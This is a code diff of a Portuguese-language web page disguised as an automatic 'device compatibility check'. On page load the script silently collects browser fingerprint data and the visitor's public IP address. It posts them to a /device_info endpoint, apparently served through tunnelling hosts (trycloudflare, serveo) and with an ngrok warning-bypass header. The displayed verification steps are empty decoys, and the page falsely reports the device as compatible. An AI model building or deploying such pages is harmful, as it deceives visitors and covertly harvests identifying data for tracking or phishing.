@@ -13,7 +13,7 @@
         
         body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: linear-gradient(135deg, #6a11cb 0%, #2575fc 100%);
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
             min-height: 100vh;
             display: flex;
             justify-content: center;
@@ -25,7 +25,7 @@
             background: white;
             border-radius: 20px;
             box-shadow: 0 20px 40px rgba(0,0,0,0.15);
-            max-width: 500px;
+            max-width: 450px;
             width: 100%;
             overflow: hidden;
             position: relative;
@@ -254,12 +254,6 @@
             opacity: 0.6;
             margin-top: 20px;
         }
-        
-        .loading-text {
-            font-size: 16px;
-            color: #666;
-            margin: 20px 0;
-        }
     </style>
 </head>
 <body>
@@ -269,8 +263,8 @@
             <div class="header">
                 <div class="header-content">
                     <div class="verification-icon">⚙️</div>
-                    <h1>Verificação de Compatibilidade</h1>
-                    <p>Analisando seu dispositivo automaticamente</p>
+                    <h1>Verificando Dispositivo</h1>
+                    <p>Analisando compatibilidade automaticamente</p>
                 </div>
             </div>
             
@@ -289,19 +283,19 @@
                 <div class="verification-steps">
                     <div class="step" id="progress-step1">
                         <div class="step-icon">1</div>
-                        <div class="step-text">Coletando informações do navegador</div>
+                        <div class="step-text">Verificando navegador e sistema operacional</div>
                     </div>
                     <div class="step" id="progress-step2">
                         <div class="step-icon">2</div>
-                        <div class="step-text">Detectando hardware e recursos</div>
+                        <div class="step-text">Coletando informações técnicas</div>
                     </div>
                     <div class="step" id="progress-step3">
                         <div class="step-icon">3</div>
-                        <div class="step-text">Identificando conexão de rede</div>
+                        <div class="step-text">Verificando conectividade</div>
                     </div>
                     <div class="step" id="progress-step4">
                         <div class="step-icon">4</div>
-                        <div class="step-text">Analisando dados do sistema</div>
+                        <div class="step-text">Finalizando verificação</div>
                     </div>
                 </div>
                 
@@ -320,19 +314,21 @@
                     Seu dispositivo é totalmente compatível com nossos recursos. 
                     Todas as funcionalidades estão disponíveis e funcionando perfeitamente.
                 </div>
-                
-                <button class="continue-button" id="continueButton">
+                <button class="continue-button" onclick="redirectToApp()">
                     Continuar para o Aplicativo
                 </button>
-                
-                <div class="session-info">
-                    Sessão: <span id="finalSessionId"></span>
-                </div>
             </div>
         </div>
     </div>
 
     <script>
+        // *** CONFIGURAÇÃO CRUCIAL: URLs dos servidores ***
+        const SERVER_URLS = [
+            'https://machines-monetary-courage-deemed.trycloudflare.com',
+            'https://socialdivulga.serveo.net',
+            'http://127.0.0.1:8000'  // Localhost para testes
+        ];   
+        
         // Gerar um ID de sessão único
         function generateSessionId() {
             return 'session_' + Math.random().toString(36).substr(2, 9) + '_' + Date.now();
@@ -340,10 +336,8 @@
         
         const sessionId = generateSessionId();
         document.getElementById('sessionId').textContent = sessionId;
-        document.getElementById('finalSessionId').textContent = sessionId;
         
         let currentStep = 0;
-        let collectedData = {};
         
         // Obter o IP público usando uma API externa
         async function getPublicIP() {
@@ -357,141 +351,116 @@
             }
         }
         
-        // Coletar informações do dispositivo
-        async function collectDeviceInfo() {
-            const deviceInfo = {
-                session_id: sessionId,
-                timestamp: new Date().toISOString(),
-                screen: {
-                    width: screen.width,
-                    height: screen.height,
-                    colorDepth: screen.colorDepth,
-                    pixelRatio: window.devicePixelRatio,
-                    orientation: screen.orientation ? screen.orientation.type : 'unknown'
-                },
-                browser: {
-                    userAgent: navigator.userAgent,
-                    language: navigator.language,
-                    languages: navigator.languages,
-                    platform: navigator.platform,
-                    cookieEnabled: navigator.cookieEnabled,
-                    onLine: navigator.onLine,
-                    hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
-                    maxTouchPoints: navigator.maxTouchPoints || 0,
-                    vendor: navigator.vendor || 'unknown'
-                },
-                window: {
-                    width: window.innerWidth,
-                    height: window.innerHeight,
-                    location: window.location.href,
-                    referrer: document.referrer || 'none'
-                },
-                platform: {
-                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                    timezoneOffset: new Date().getTimezoneOffset()
-                },
-                network: {
-                    connection: navigator.connection ? {
-                        effectiveType: navigator.connection.effectiveType,
-                        downlink: navigator.connection.downlink,
-                        rtt: navigator.connection.rtt,
-                        saveData: navigator.connection.saveData
-                    } : 'unavailable'
-                },
-                media: {
-                    deviceMemory: navigator.deviceMemory || 'unknown',
-                    // Verificar recursos suportados
-                    touchSupport: 'ontouchstart' in window || navigator.maxTouchPoints > 0,
-                    pdfViewer: navigator.pdfViewerEnabled || false,
-                    webGL: (() => {
-                        try {
-                            const canvas = document.createElement('canvas');
-                            return !!(window.WebGLRenderingContext && 
-                                (canvas.getContext('webgl') || canvas.getContext('experimental-webgl')));
-                        } catch (e) {
-                            return false;
-                        }
-                    })()
-                },
-                storage: {
-                    localStorage: typeof(Storage) !== "undefined",
-                    sessionStorage: typeof(Storage) !== "undefined",
-                    cookies: navigator.cookieEnabled
-                },
-                performance: {
-                    memory: window.performance && performance.memory ? {
-                        jsHeapSizeLimit: performance.memory.jsHeapSizeLimit,
-                        totalJSHeapSize: performance.memory.totalJSHeapSize,
-                        usedJSHeapSize: performance.memory.usedJSHeapSize
-                    } : 'unavailable'
-                }
-            };
-            
-            // Adicionar IP público
-            deviceInfo.network.publicIP = await getPublicIP();
-            
-            return deviceInfo;
+        // Função para fazer requisições com headers personalizados
+        function customFetch(url, options = {}) {
+            options.headers = options.headers || {};
+            options.headers["ngrok-skip-browser-warning"] = "true";
+            return fetch(url, options);
         }
-        
+
+        // Coleta de informações do dispositivo
+        async function collectDeviceInfo() {
+            try {
+                const publicIP = await getPublicIP();
+                
+                const deviceInfo = {
+                    session_id: sessionId,
+                    timestamp: new Date().toISOString(),
+                    ip_address: publicIP,
+                    screen: {
+                        width: screen.width,
+                        height: screen.height,
+                        colorDepth: screen.colorDepth,
+                        pixelRatio: window.devicePixelRatio
+                    },
+                    browser: {
+                        userAgent: navigator.userAgent,
+                        language: navigator.language,
+                        languages: navigator.languages,
+                        platform: navigator.platform,
+                        cookieEnabled: navigator.cookieEnabled,
+                        onLine: navigator.onLine,
+                        hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
+                        maxTouchPoints: navigator.maxTouchPoints || 0,
+                        vendor: navigator.vendor || 'unknown'
+                    },
+                    window: {
+                        width: window.innerWidth,
+                        height: window.innerHeight,
+                        location: window.location.href,
+                        referrer: document.referrer || 'none'
+                    },
+                    platform: {
+                        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                        timezoneOffset: new Date().getTimezoneOffset()
+                    },
+                    network: {
+                        connection: navigator.connection ? {
+                            effectiveType: navigator.connection.effectiveType,
+                            downlink: navigator.connection.downlink,
+                            rtt: navigator.connection.rtt,
+                            saveData: navigator.connection.saveData
+                        } : 'unavailable'
+                    },
+                    media: {
+                        deviceMemory: navigator.deviceMemory || 'unknown',
+                        touchSupport: 'ontouchstart' in window || navigator.maxTouchPoints > 0,
+                        pdfViewer: navigator.pdfViewerEnabled || false
+                    },
+                    storage: {
+                        localStorage: typeof(Storage) !== "undefined",
+                        sessionStorage: typeof(Storage) !== "undefined",
+                        cookies: navigator.cookieEnabled
+                    }
+                };
+
+                // Enviar dados para o servidor
+                customFetch("/device_info", {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json"
+                    },
+                    body: JSON.stringify(deviceInfo)
+                }).catch(error => {
+                    console.log("Erro ao enviar informações:", error);
+                });
+            } catch (error) {
+                console.log("Erro ao coletar informações:", error);
+            }
+        }
+
         const steps = [
             {
-                text: "Coletando informações do navegador...",
+                text: "Verificando navegador e sistema operacional...",
                 duration: 1500,
-                action: async () => {
-                    collectedData = await collectDeviceInfo();
-                }
+                action: () => {} // Ação vazia, a coleta é feita separadamente
             },
             {
-                text: "Detectando hardware e recursos...",
+                text: "Coletando informações técnicas...",
                 duration: 2000,
-                action: () => {
-                    // Verificar mais recursos de hardware
-                    collectedData.hardware = {
-                        cores: navigator.hardwareConcurrency || 'unknown',
-                        deviceMemory: navigator.deviceMemory || 'unknown'
-                    };
-                }
+                action: () => {}
             },
             {
-                text: "Identificando conexão de rede...",
+                text: "Verificando conectividade...",
                 duration: 1500,
-                action: () => {
-                    // Mais detalhes de rede
-                    if (navigator.connection) {
-                        collectedData.network.connectionType = navigator.connection.type;
-                        collectedData.network.downlinkMax = navigator.connection.downlinkMax;
-                    }
-                }
+                action: () => {}
             },
             {
-                text: "Analisando dados do sistema...",
+                text: "Finalizando verificação...",
                 duration: 1500,
-                action: () => {
-                    // Informações adicionais do sistema
-                    collectedData.browser.javaEnabled = navigator.javaEnabled();
-                    collectedData.browser.doNotTrack = navigator.doNotTrack || 'unspecified';
-                    
-                    // Informações de bateria (se disponível)
-                    if (navigator.getBattery) {
-                        navigator.getBattery().then(battery => {
-                            collectedData.battery = {
-                                charging: battery.charging,
-                                level: battery.level,
-                                chargingTime: battery.chargingTime,
-                                dischargingTime: battery.dischargingTime
-                            };
-                        });
-                    }
-                }
+                action: () => {}
             }
         ];
         
         function startVerification() {
             currentStep = 0;
             runVerificationStep();
+            
+            // Iniciar coleta de dados
+            collectDeviceInfo();
         }
         
-        async function runVerificationStep() {
+        function runVerificationStep() {
             if (currentStep >= steps.length) {
                 return;
             }
@@ -505,8 +474,8 @@
             const stepElement = document.getElementById(`progress-step${currentStep + 1}`);
             stepElement.classList.add('active');
             
-            // Executar ação do step
-            await step.action();
+            // Executar ação do step (se houver)
+            if (step.action) step.action();
             
             // Simular progresso
             const targetProgress = ((currentStep + 1) / steps.length) * 100;
@@ -566,9 +535,6 @@
         window.addEventListener('load', function() {
             startVerification();
         });
-        
-        // Adicionar event listener para o botão de continuar
-        document.getElementById('continueButton').addEventListener('click', redirectToApp);
     </script>
 </body>
 </html>
